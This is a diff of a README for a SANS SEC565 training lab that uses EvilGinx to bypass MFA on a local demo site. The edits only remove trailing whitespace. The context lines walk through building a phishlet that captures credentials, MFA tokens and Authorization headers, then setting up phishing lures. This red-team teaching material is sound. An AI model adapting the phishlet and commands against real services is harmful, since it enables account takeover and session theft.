@@ -1,7 +1,7 @@
 # Lab: Bypassing MFA with EvilGinx - SEC565 DEMO
 
-This lab is a bonus lab in SANS SEC565: Red Teaming and adversary emulation. 
-For more information, or to enroll please check 
+This lab is a bonus lab in SANS SEC565: Red Teaming and adversary emulation.
+For more information, or to enroll please check
 
 https://www.sans.org/cyber-security-courses/red-team-operations-adversary-emulation/
 
@@ -9,7 +9,7 @@ https://www.sans.org/cyber-security-courses/red-team-operations-adversary-emulat
 
 - set up an EvilGinx Phishlet to target the phisherman web application
 - phish the victim user
-- inject victim user's session into attackers browser 
+- inject victim user's session into attackers browser
 
 
 
@@ -62,34 +62,34 @@ add the following values to the file: <br>
 
   ## Walkthrough
 
-  In this lab we will explore how to setup evilginx (a proxy in the middle framework) and how we can use it to bypass multifactor authentication. 
+  In this lab we will explore how to setup evilginx (a proxy in the middle framework) and how we can use it to bypass multifactor authentication.
 
-  EvilGinx uses the concepts of phishlets (https://help.evilginx.com/community/phishlet-format) to capture credentials and the authenticated session token. 
-  In order for us to create a phishlet we first need to understand our target website. 
+  EvilGinx uses the concepts of phishlets (https://help.evilginx.com/community/phishlet-format) to capture credentials and the authenticated session token.
+  In order for us to create a phishlet we first need to understand our target website.
 
 
   ### Exploring the target
 
   Let's browse to our target website.
-  
-  1. Open up a webbrowser and browse to https://sec565.rocks 
+
+  1. Open up a webbrowser and browse to https://sec565.rocks
 
 
      ![](media/565rocks.png)
 
 
-  2. Click on the login button. 
-  
+  2. Click on the login button.
+
         This will reveal two important fields to us, the username field and password field.
-  
-        We need to keep track on how these fields are called in the HTML code so we can feed it to our phishlet later. 
-   
+
+        We need to keep track on how these fields are called in the HTML code so we can feed it to our phishlet later.
+
         We can do this in a lot of ways such as using an intercepting proxy like BurpSuite or use the developertools and inspect the elements. Put your cursor in the email input bar and right click. Select inspect from the menu.
 
         ![](media/inspect.png)
 
 
-  3. In the developer console that opened, you can see that the email field has a `name` attribute called email. 
+  3. In the developer console that opened, you can see that the email field has a `name` attribute called email.
 
 
         ![](media/emailfield.png)
@@ -98,10 +98,10 @@ add the following values to the file: <br>
 
   ![](media/passwordfield.png)
 
-  
+
   5. The best way to create a phishlet is actually signing up for an account and understanding how the application works. So let's do that now.
   Go ahead and click the register button.
-    
+
   6. You can fill out any first and last name as well as email and password that you want. This data is all localized and does not get sent anywhere nor is there strict validation on input so feel free to insert fake data.
 
      ![](media/registration.png)
@@ -113,7 +113,7 @@ add the following values to the file: <br>
      ![](media/qr.png)
 
   8. Open up the developer console (F12 on your keyboard), navigate to the Network tab and go back to the login page.
-  
+
         ![](media/devconsolelogin.png)
 
   9. Fill out your credentials that you used to register your account and press submit.
@@ -127,18 +127,18 @@ add the following values to the file: <br>
 
         ![](media/mfa.png)
 
-  12. Once you succesfully logged into the application, you are going to see another `POST` request in your developer tab as well as calls to the validate-token API endpoint and the sensitive-data API endpoint. Inspecting the MFA POST request, will reveal another JSON post. This time containing email as well as mfaToken. 
+  12. Once you succesfully logged into the application, you are going to see another `POST` request in your developer tab as well as calls to the validate-token API endpoint and the sensitive-data API endpoint. Inspecting the MFA POST request, will reveal another JSON post. This time containing email as well as mfaToken.
 
         ![](media/mfaverify.png)
 
-  ### Creating the phishlet. 
-  
+  ### Creating the phishlet.
+
   Now that we have some knowledge on the flow of the application, we can create our phishlet.
   Navigate to your phisherman directory and create a new file called `sec565rocks.yaml`.
 
   ![](media/newfile.png)
 
-  13. Go ahead and copy the contents from `example.yaml` into `sec565rocks.yaml`. 
+  13. Go ahead and copy the contents from `example.yaml` into `sec565rocks.yaml`.
 
         ![](media/phishlet1.png)
 
@@ -160,17 +160,17 @@ add the following values to the file: <br>
 
   15. Our `sec565.rocks` website does not redirect to any external websites. So we can remove the `sub_filters` from our phishlet (lines 4 and 5).
 
-  16. The next step is figuring out how sessions remain authenticated in the web application. 
-      Modern web applications can use a variety of session management tools such as HTTP headers (Authorization header) or cookies. 
-      
-      If we take a look at our developer console requests, we can see that we have a call to `validate-token`. This likely means that a login was successfull and that some type of token is being validated against the backend. 
+  16. The next step is figuring out how sessions remain authenticated in the web application.
+      Modern web applications can use a variety of session management tools such as HTTP headers (Authorization header) or cookies.
 
-      If we inspect the request headers, it reveals that there is in fact an Authorization header being sent to the backend, which signifies that the backend is doing session management through authorization token. 
+      If we take a look at our developer console requests, we can see that we have a call to `validate-token`. This likely means that a login was successfull and that some type of token is being validated against the backend.
+
+      If we inspect the request headers, it reveals that there is in fact an Authorization header being sent to the backend, which signifies that the backend is doing session management through authorization token.
 
       ![](media/authheader.png)
 
   17. Now that we know that the web application is doing session management using an Authorization header, we can put it in our phishlet. <br>
-  
+
 
         Here's what `auth_tokens` are used for according to Evilginx's documentation
 
@@ -187,7 +187,7 @@ add the following values to the file: <br>
         - domain: 'sec565.rocks'
             path: '/api/auth/validate-token'
             name: 'token'
-            header: 'Authorization'  
+            header: 'Authorization'
             type: 'http'
 
         ```
@@ -227,7 +227,7 @@ add the following values to the file: <br>
     username:
         key: ''
         search: '"email":"([^"]*)'
-        type: 'json'    
+        type: 'json'
     password:
         key: ''
         search: '"password":"([^"]*)'
@@ -261,7 +261,7 @@ auth_tokens:
   - domain: 'sec565.rocks'
     path: '/api/auth/validate-token'
     name: 'token'
-    header: 'Authorization'  
+    header: 'Authorization'
     type: 'http'
 auth_urls:
   - '/sensitive-data'
@@ -272,7 +272,7 @@ credentials:
   username:
     key: ''
     search: '"email":"([^"]*)'
-    type: 'json'    
+    type: 'json'
   password:
     key: ''
     search: '"password":"([^"]*)'
@@ -281,7 +281,7 @@ credentials:
     key: 'mfaToken'
     search: '"mfaToken":"([^"]*)'
     type: 'json'
-   
+
 login:
   domain: 'sec565.rocks'
   path: '/login'
@@ -299,10 +299,10 @@ login:
 
     ```
 
-22. Once bashed into the container, launch EvilGinx in `developer` mode. Developer mode ensures that domain checks are not enforced and allows us to specify the loopback interface as public facing IP address. 
+22. Once bashed into the container, launch EvilGinx in `developer` mode. Developer mode ensures that domain checks are not enforced and allows us to specify the loopback interface as public facing IP address.
 
-    This is of course because we are running everything locally. In a real operation you'd have to specify your internet facing IP address here. 
-    
+    This is of course because we are running everything locally. In a real operation you'd have to specify your internet facing IP address here.
+
     ```bash
     ./evilginx -developer
     ```
@@ -310,7 +310,7 @@ login:
     ![](media/evilginx1.png)
 
 
-23. EvilGinx will helpfully give us suggestions of what to do next. Right now we need to specify the phishing domain as well as the public IP address of our EvilGinx server. 
+23. EvilGinx will helpfully give us suggestions of what to do next. Right now we need to specify the phishing domain as well as the public IP address of our EvilGinx server.
 
     type the following commands in EvilGinx:
 
@@ -324,10 +324,10 @@ login:
     ```
 
 
-    This sets our phishing domain to `sec565.phish` as that's what we put in our hosts file. 
-    In a real operation you'd obviously need to specify an actual domain that you own. 
+    This sets our phishing domain to `sec565.phish` as that's what we put in our hosts file.
+    In a real operation you'd obviously need to specify an actual domain that you own.
 
-    Since we are running in dev mode, the domain verification check is not being enforced, hence why we set our IPV4 to loopback. 
+    Since we are running in dev mode, the domain verification check is not being enforced, hence why we set our IPV4 to loopback.
 
 
     ![](media/evilginx2.png)
@@ -339,23 +339,23 @@ login:
     phishlets hostname sec565rocks sec565.phish
     ```
 
-25. Once we have tied our phishing domain to our phishlet, we can enable the phishlet. 
+25. Once we have tied our phishing domain to our phishlet, we can enable the phishlet.
 
     ```bash
     phishlets enable sec565rocks
     ```
 
-26. Now that we have enabled our phishlet, we can generate lures for our phishlet. A lure is going to be the link we actually send to our victim. 
+26. Now that we have enabled our phishlet, we can generate lures for our phishlet. A lure is going to be the link we actually send to our victim.
 
 
     ```bash
     lures create sec565rocks
     ```
 
-    Once we have a lure created we can get the lure URL using 
+    Once we have a lure created we can get the lure URL using
 
     ```bash
-    lures get-url <lure ID> 
+    lures get-url <lure ID>
     ```
 
     for example
@@ -367,7 +367,7 @@ login:
     ![](media/evilginx3.png)
 
 
-27. Now that we have the lure, we can send our phish to our victim! Browse to https://sec565.rocks and click on the `Automatic Phishing Simulation` button. 
+27. Now that we have the lure, we can send our phish to our victim! Browse to https://sec565.rocks and click on the `Automatic Phishing Simulation` button.
 
 
     ![](media/565rocks.png)
